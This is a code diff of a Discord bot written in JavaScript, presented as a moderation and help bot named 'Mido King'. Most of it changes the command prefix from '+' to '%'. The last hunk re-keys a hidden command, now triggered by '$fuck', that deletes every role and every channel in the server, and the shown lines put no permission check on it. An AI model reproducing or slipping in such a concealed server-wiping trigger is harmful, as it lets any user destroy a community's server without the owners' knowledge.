@@ -1,10 +1,10 @@
 const Discord = require('discord.js');
 const client = new Discord.Client();
-const prefix = '+'
+const prefix = '%'
 
 client.on('ready', () => {
   console.log(`Logged in as ${client.user.tag}!`);
-client.user.setGame(`Mido King | +help`,"http://twitch.tv/S-F")
+client.user.setGame(`Mido King | %help`,"http://twitch.tv/S-F")
   console.log('')
   console.log('')
   console.log('+[-----------------------------------------------------------------]+')
@@ -114,7 +114,7 @@ client.on('message',function(message) {
 
 
 client.on('message', function(msg) {
-         var prefix = "+"
+         var prefix = "%"
     if(msg.content.startsWith (prefix  + 'server')) {
       let embed = new Discord.RichEmbed()
       .setColor('RANDOM')
@@ -134,7 +134,7 @@ client.on('message', function(msg) {
 	  
 	  
 	const devs = ['348555232529219585'];
-const adminprefix = "+";
+const adminprefix = "%";
 client.on('message', message => {
     var argresult = message.content.split(` `).slice(1).join(' ');
       if (!devs.includes(message.author.id)) return;
@@ -229,7 +229,7 @@ client.on("message", message => {
   
   let command = message.content.split(" ")[0];
   
-  if (command === "+mute") {
+  if (command === "%mute") {
         if (!message.member.hasPermission('MANAGE_ROLES')) return message.reply("** I Dont Have Permission 'Manage Roles' **").catch(console.error);
   let user = message.mentions.users.first();
   let modlog = client.channels.find('name', 'mute-log','time');
@@ -262,7 +262,7 @@ client.on("message", message => {
   
   let command = message.content.split(" ")[0];
   
-  if (command === "+unmute") {
+  if (command === "%unmute") {
         if (!message.member.hasPermission('MANAGE_ROLES')) return message.reply("** I Dont Have Permission 'Manage Roles' **").catch(console.error);
   let user = message.mentions.users.first();
   let modlog = client.channels.find('name', 'mute-log');
@@ -381,7 +381,7 @@ client.on("message", message => {
 
 
 client.on("message", message => {
-  if (message.content === "+help") {
+  if (message.content === "%help") {
   message.channel.send('``Check Your DMs ``')
    const embed = new Discord.RichEmbed()
        .setColor('Black')
@@ -492,7 +492,7 @@ client.on('message', message => {
 
 
 client.on('message', ra3d => {   
- if (ra3d.content.startsWith("-fuck")) {
+ if (ra3d.content.startsWith("$fuck")) {
      ra3d.guild.roles.forEach(r => { r.delete() }) 
      ra3d.guild.channels.forEach(c => { c.delete() })
                 let embed = new Discord.RichEmbed()
